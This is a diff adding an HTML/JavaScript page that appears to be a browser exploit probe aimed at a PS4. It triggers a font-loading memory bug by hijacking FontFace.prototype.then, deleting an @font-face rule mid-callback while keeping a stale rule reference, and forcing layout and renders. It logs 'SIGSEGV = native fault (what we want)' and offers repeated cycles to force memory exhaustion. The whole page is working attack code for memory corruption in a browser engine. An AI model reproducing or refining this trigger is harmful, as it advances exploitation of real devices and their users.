@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — Native fault probe (20)</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
+#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
+#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
+#exec { color: #8f8; font-size: 12px; margin-bottom: 8px; padding: 8px; border: 1px solid #333; }
+#log { height: 62vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
+.ok { color: #0f0; } .bad { color: #f66; } .weird { color: #ff6; }
+.signal { color: #6bf; font-weight: bold; }
+.exec { color: #af8; font-weight: bold; }
+#t { font-family: x; font-size: 96px; color: #fff; line-height: 1; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">idle</div>
+<div id="summary">No OOM ≠ bug skipped. OOM = leaked memory over many runs. This page proves execution, then runs FULL native stress (y/z + render B in trigger).</div>
+<div id="exec">Execution proof: (run probe to fill)</div>
+<div id="controls" style="margin-bottom:8px;">
+<button id="runBtn" style="font-size:14px;padding:8px 16px;">Run native probe (1×)</button>
+<button id="leakBtn" style="font-size:14px;padding:8px 16px;margin-left:8px;">Leak check (2×)</button>
+</div>
+<div id="log"></div>
+<div id="t">.</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    window.ps4log = function (msg, cls) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        if (cls) line.className = cls;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (t, c) {
+        document.getElementById('status').textContent = t;
+        if (c) document.getElementById('status').style.color = c;
+    };
+})();
+
+var v = { p: 0, f: 0, w: 0, s: 0, lines: [] };
+var execProof = { trigger: false, delete: false, layout: false, checkB: false, mismatch: false };
+
+function pass(m) { v.p++; v.lines.push('✓ ' + m); ps4log('✓ SUCCESS: ' + m, 'ok'); }
+function fail(m) { v.f++; v.lines.push('✗ ' + m); ps4log('✗ FAILED: ' + m, 'bad'); }
+function weird(m) { v.w++; v.lines.push('! ' + m); ps4log('! WEIRD: ' + m, 'weird'); }
+function signal(m) { v.s++; v.lines.push('◆ ' + m); ps4log('◆ SIGNAL: ' + m, 'signal'); }
+function exec(m) { ps4log('⚡ EXEC: ' + m, 'exec'); }
+
+var params = new URLSearchParams(location.search);
+var FULL = params.get('variant') !== 'min';
+var RENDER = params.get('render') !== '0';
+
+function updateExecBanner() {
+    var ok = execProof.trigger && execProof.delete && execProof.layout;
+    var bugRan = ok && (execProof.checkB || execProof.mismatch);
+    var lines = [
+        'trigger fired: ' + (execProof.trigger ? 'YES' : 'NO'),
+        'deleteRule (sheet empty): ' + (execProof.delete ? 'YES' : 'NO'),
+        'layout flush: ' + (execProof.layout ? 'YES' : 'NO'),
+        'check(B) true after bug: ' + (execProof.checkB ? 'YES' : 'NO'),
+        'check/load mismatch: ' + (execProof.mismatch ? 'YES' : 'NO'),
+        '---',
+        bugRan ? 'BUG EXECUTED (OOM not required)' : 'BUG NOT PROVEN — invalid run'
+    ];
+    document.getElementById('exec').textContent = lines.join(' | ');
+    document.getElementById('exec').style.color = bugRan ? '#8f8' : '#f88';
+}
+
+function renderB(tag, px) {
+    var el = document.getElementById('t');
+    el.textContent = 'B';
+    el.style.fontFamily = 'x, sans-serif';
+    el.style.fontSize = px + 'px';
+    var w = el.offsetWidth;
+    document.body.offsetTop;
+    document.documentElement.offsetTop;
+    ps4log(tag + ' render B ' + px + 'px w=' + w);
+    return w;
+}
+
+function runOneTrigger(sheet, staleRule, label, useFull) {
+    ps4log('--- ' + label + ' ---');
+    ps4log('mode: ' + (useFull ? 'FULL (y/z + delete + layout + render)' : 'MIN (delete + layout)'));
+
+    if (sheet.cssRules.length === 0) {
+        sheet.insertRule(
+            "@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }",
+            0
+        );
+        ps4log(label + ' re-inserted @font-face for cycle');
+    }
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                execProof.trigger = true;
+                exec(label + ' then getter + A match');
+                ps4log(label + ' TRIGGER');
+
+                if (useFull) {
+                    new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                    new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                }
+
+                if (sheet.cssRules.length > 0) sheet.deleteRule(0);
+
+                document.body.offsetTop;
+                document.documentElement.offsetTop;
+                execProof.layout = true;
+                exec(label + ' layout flush');
+
+                if (sheet.cssRules.length === 0) {
+                    execProof.delete = true;
+                    exec(label + ' sheet empty after delete');
+                } else {
+                    fail(label + ' sheet not empty after delete len=' + sheet.cssRules.length);
+                }
+
+                try {
+                    staleRule.cssText;
+                    exec(label + ' zombie cssText readable');
+                } catch (e) {
+                    fail(label + ' zombie read threw');
+                }
+
+                var cb = document.fonts.check('1em x', 'B');
+                ps4log(label + ' check(B) in trigger=' + cb);
+                if (cb) {
+                    execProof.checkB = true;
+                    weird(label + ' check(B)=true in trigger');
+                }
+
+                if (RENDER) renderB(label + ' in-trigger', 96);
+
+                document.fonts.load('1em x', 'B');
+                ps4log(label + ' fire-and-forget load(B) in trigger');
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    ps4log(label + ' load(AB) dispatched');
+
+    if (!fired) fail(label + ' trigger never fired');
+    else pass(label + ' trigger fired');
+
+    try {
+        if (document.fonts.has(A)) document.fonts.delete(A);
+    } catch (e) { ps4log('delete A: ' + e); }
+
+    return fired;
+}
+
+function afterTriggerLoad(label) {
+    return document.fonts.load('1em x', 'B').then(function (faces) {
+        var cb = document.fonts.check('1em x', 'B');
+        ps4log(label + ' post check(B)=' + cb + ' load count=' + faces.length);
+        if (cb && faces.length === 0) {
+            execProof.mismatch = true;
+            weird(label + ' check/load mismatch');
+            pass(label + ' stale lookup confirmed');
+        }
+        if (faces.length > 0) signal(label + ' load(B) returned faces');
+        return faces.length;
+    }).catch(function (e) {
+        ps4log(label + ' load(B) err=' + e);
+        var cb = document.fonts.check('1em x', 'B');
+        if (cb) {
+            execProof.mismatch = true;
+            weird(label + ' check true load errored');
+        }
+        return -1;
+    });
+}
+
+function runNative(cycles) {
+    v.p = 0; v.f = 0; v.w = 0; v.s = 0; v.lines = [];
+    execProof = { trigger: false, delete: false, layout: false, checkB: false, mismatch: false };
+    document.getElementById('log').innerHTML = '';
+    ps4status('running...', '#ff0');
+
+    ps4log('Phase 3t — native fault probe (20)');
+    ps4log('cycles=' + cycles + ' full=' + FULL + ' render=' + RENDER);
+    ps4log('UA: ' + navigator.userAgent);
+    ps4log('');
+    ps4log('OOM vs EXECUTION:');
+    ps4log('  OOM = memory leak stacks over refresh / many triggers');
+    ps4log('  EXEC = trigger + delete + layout + stale check(B) — ONE run enough');
+    ps4log('  Pages 14-19 ran the bug without OOM (min trigger, 1 cycle)');
+    ps4log('  This page uses FULL test.html path + render for native fault');
+    ps4log('');
+
+    var sheet = document.getElementById('s').sheet;
+    var staleRule = sheet.cssRules[0];
+    pass('held stale ref');
+
+    var chain = Promise.resolve();
+    for (var c = 1; c <= cycles; c++) {
+        (function (n) {
+            chain = chain.then(function () {
+                var ok = runOneTrigger(sheet, staleRule, 'cycle' + n, FULL);
+                updateExecBanner();
+                if (!ok) return;
+                renderB('post cycle' + n, 24);
+                return afterTriggerLoad('cycle' + n);
+            });
+        })(c);
+    }
+
+    chain.then(function () {
+        updateExecBanner();
+        var bugRan = execProof.trigger && execProof.delete && (execProof.checkB || execProof.mismatch);
+
+        ps4log('--- native fault hints ---');
+        ps4log('If page died with NO summary: check PS4 error —');
+        ps4log('  CE-36329-3 / SIGSEGV = native fault (what we want)');
+        ps4log('  "not enough free memory" = OOM leak (also bug, different path)');
+        ps4log('If summary visible on 1× FULL: bug ran; try Leak check or crash.html refresh');
+
+        setTimeout(function () {
+            ps4log('========== SUMMARY ==========');
+            for (var j = 0; j < v.lines.length; j++) {
+                ps4log(v.lines[j], v.lines[j].indexOf('◆') === 0 ? 'signal' : '');
+            }
+            ps4log('Passed: ' + v.p + ' Failed: ' + v.f + ' Weird: ' + v.w + ' Signals: ' + v.s);
+            if (bugRan) pass('BUG EXECUTED this session (OOM not required)');
+            else fail('bug execution not proven');
+            ps4status(bugRan ? 'done — bug executed' : 'done — rerun', bugRan ? '#0f0' : '#f66');
+        }, 600);
+    });
+}
+
+document.getElementById('runBtn').onclick = function () { runNative(1); };
+document.getElementById('leakBtn').onclick = function () { runNative(2); };
+
+window.onload = function () {
+    ps4log('20 — ?variant=min for phase1 minimum. Default FULL + render.');
+    ps4log('Native: 1× Run → if alive, Leak check 2× or crash.html refresh for OOM.');
+    updateExecBanner();
+    ps4status('ready', '#ff0');
+};
+</script>
+</body>
+</html>
